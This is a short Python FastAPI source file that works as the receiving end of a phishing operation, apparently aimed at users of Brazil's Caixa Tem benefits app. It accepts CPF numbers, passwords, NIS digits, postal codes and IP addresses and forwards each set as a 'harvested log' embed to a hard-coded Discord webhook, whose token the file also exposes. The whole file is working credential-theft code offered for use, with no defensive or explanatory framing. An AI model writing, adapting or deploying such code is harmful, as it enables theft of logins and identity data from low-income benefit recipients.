from fastapi import FastAPI
from discord import Webhook, RequestsWebhookAdapter, Embed
from discord.ext import tasks
from datetime import datetime
#pip install discord fastapi uvicorn
app = FastAPI()
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1212172146584059995/MUj3OC7ZgNlR4tt-Oxk_PSfSuLKbX0um_ROY0xkHDiioFRRoJhZQe8H3YK6FfblVYcK_"
webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter())
def send_embed(cpf,senha,nis,cep,ip):
    embed = Embed(title="Novo LOG COLHIDO", description="log colhido e redirecionado")
    embed.add_field(name="CPF: ", value=cpf, inline=True)
    embed.add_field(name="Final Nis", value=nis, inline=True)
    embed.add_field(name="SENHA: ", value=senha, inline=False)
    embed.add_field(name="CEP: ", value=cep, inline=True)
    embed.add_field(name="IP: ", value=ip, inline=True)
    embed.set_image(url="https://i.imgur.com/A5dBNel.jpeg")
    embed.set_author(name="FlashCash Company", icon_url="https://classic.exame.com/wp-content/uploads/2016/09/size_960_16_9_hacker192.jpg?quality=70&strip=info&w=960")
    embed.colour = 0x1f8b4c
    embed.set_thumbnail(url="https://seucreditodigital.com.br/wp-content/uploads/2023/07/dinheiro-extra-Caixa-Tem.jpg")
    embed.timestamp = datetime.utcnow()
    webhook.send(embed=embed)
@app.post("/send-embed/{cpf}/{senha}/{nis}/{cep}/{ip}")
async def send_embed_route(cpf: str, senha: str, nis: str, cep: str,ip: str):
    send_embed(cpf, senha, nis, cep, ip)
    return {"message": f"Embed enviado com sucesso para {cpf}!"}